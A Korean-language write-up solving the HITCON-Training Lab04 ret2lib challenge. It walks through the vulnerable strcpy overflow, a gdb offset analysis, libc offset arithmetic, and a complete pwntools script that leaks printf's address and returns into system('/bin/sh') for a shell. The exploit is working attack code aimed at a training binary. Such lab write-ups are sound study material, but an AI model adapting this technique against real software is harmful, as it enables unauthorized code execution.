# [HITCON-Training] Lab04 ret2lib 풀이

- checksec을 통해 보호기법 확인하기

![image](https://user-images.githubusercontent.com/59410565/118209666-023b2980-b4a4-11eb-8c11-89ae5ef44e8f.png)

32bit 파일이고, Partial RELRO와 NX가 적용되어 있다. RET 변조를 통해 문제를 해결할 수 있을 것 같다.

- ret2lic 코드 살펴보기

```c
#include <stdio.h>

void See_something(unsigned int addr){
	int *address ;
	address = (int *)addr ;
	printf("The content of the address : %p\n",*address);
};

void Print_message(char *mesg){
	char buf[48];
	strcpy(buf,mesg);
	printf("Your message is : %s",buf);
}

int main(){
	char address[10] ;
	char message[256];
	unsigned int addr ;
	puts("###############################");
	puts("Do you know return to library ?");
	puts("###############################");
	puts("What do you want to see in memory?");
	printf("Give me an address (in dec) :");
	fflush(stdout);
	read(0,address,10);
	addr = strtol(address);
	See_something(addr) ;
	printf("Leave some message for me :");
	fflush(stdout);
	read(0,message,256);
	Print_message(message);
	puts("Thanks you ~");
	return 0 ;
}
```

//main() 함수

> 저번에 정리했던 Lazenca Return to libc와 비슷한 구조인 것 같다.

- read() 함수가 정해진 address와 message길이만큼 읽어오기 때문에 overflow가 불가능하다.
- fflush() 함수는 파일 스트림 버퍼를 비우는 함수이다. 성공시 0을 반환하고, 에러시 EOF를 반환한다.

//See_something() 함수

- address 변수의 주소를 출력한다. leak에 사용

//Print_message() 함수

- dest에 src를 복사하는데 이때 buf의 크기(48)보다 mesg의 크기(256)가 작기 때문에 overflow가 발생한다. 

------



### 풀이

![image](https://user-images.githubusercontent.com/59410565/118213181-65c75600-b4a8-11eb-8f66-aa66a495fe2b.png)

**[Break Point]**

- Print_message + 0 : Print_message()의 첫 번째 명령어
- Print_message + 19 : strcpy() 함수 호출
- Print_message + 44 : Print_message()의 RET 명령어

![image](https://user-images.githubusercontent.com/59410565/118213572-2f3e0b00-b4a9-11eb-9b5a-b83af8d54a62.png)

프로그램을 실행시키고 아무 숫자나 입력했더니 Segmentation fault가 떴다.

- leak을 위해 IDA로 printf 주소 알아내기

> system 함수의 주소를 찾듯이 "print printf"를 사용해도 가능

![image](https://user-images.githubusercontent.com/59410565/118215248-26026d80-b4ac-11eb-9020-25e6d4ef1be3.png)

printf()의 주소는 0x0804a010이다. 이 주소를 10진수로 변환하여 입력해주면 segmentation fault 없이 실행할 수 있을 것 같다.

![image](https://user-images.githubusercontent.com/59410565/118215592-c22c7480-b4ac-11eb-891c-808c1e3bc7bc.png)

다시 실행해보자.

![image](https://user-images.githubusercontent.com/59410565/118215640-e38d6080-b4ac-11eb-9894-83ebb2d03e00.png)

다음으로 잘 넘어가는 것을 볼 수 있다. print() 함수의 주소는 **0xf7e4c680**이다.

이제 message의 크기만큼 A를 입력해보자.

![image](https://user-images.githubusercontent.com/59410565/118215743-1c2d3a00-b4ad-11eb-8baf-0c21f64b0d44.png)

![image](https://user-images.githubusercontent.com/59410565/118215841-54347d00-b4ad-11eb-9be9-a6821eb59ba4.png)

Print_message() 함수의 최상위 스택 주소는 0xffffcedc이다. 이 영역에 Return address(0x08048657)가 저장되어 있다.

![image](https://user-images.githubusercontent.com/59410565/118216032-b2616000-b4ad-11eb-9d5e-46937de0ab39.png)

![image](https://user-images.githubusercontent.com/59410565/118216190-ffddcd00-b4ad-11eb-8d8a-ae21daa372ac.png)

buf(=dest)의 위치는 0xffffcea0이고, Return address와 60byte 떨어져 있다. 즉, 문자를 60개 이상 입력하면, Return address를 덮어쓸 수 있다.

![image](https://user-images.githubusercontent.com/59410565/118216361-54814800-b4ae-11eb-8251-0f2b4d23e86c.png)  

![image](https://user-images.githubusercontent.com/59410565/118216404-66fb8180-b4ae-11eb-801c-a42f89ce2ab4.png)

0xffffcedc의 영역이 바뀌었다.

**["/bin/sh" 주소 찾기]**

![image](https://user-images.githubusercontent.com/59410565/118216513-9e6a2e00-b4ae-11eb-98a2-6c10b258a691.png) 

- 0xf7e4c680(printf function address in libc) - 0xf7e0c000(libc Start Address) = 0x40680(libc Base Address offset)
- 0xf7e3ddb0(system function address in libc) - 0xf7e0c000(libc Start Address) = 0x31db0(system function Address offset)
- 0xf7f5eb2b("/bin/sh" string address in libc) - 0xf7e0c000(libc Start Address) = 0x152b2b("/bin/sh" string Address offset)

![image](https://user-images.githubusercontent.com/59410565/118216745-0b7dc380-b4af-11eb-80c0-4ba0c99ff8db.png)

------



### Exploit

```python
from pwn import *

p = process("./ret2lib")

p.sendlineafter("Give me an address (in dec) :", "134520848")

p.recvuntil("The content of the address : ")
printAddr = p.recvuntil('\n')
printAddr = int(printAddr, 16)

libcBase = printAddr - 0x40680
sysAddr = libcBase + 0x31db0
binsh = libcBase + 0x152b2b
p.recvuntil("Leave some message for me :")

print hex(libcBase)
print hex(sysAddr)
print hex(binsh)

exploit = "A" * 60
exploit += p32(sysAddr)
exploit += 'BBBB'
exploit += p32(binsh)

p.send(exploit)
p.interactive()

```



![image](https://user-images.githubusercontent.com/59410565/118217954-703a1d80-b4b1-11eb-81b0-34b6a33c58e8.png)

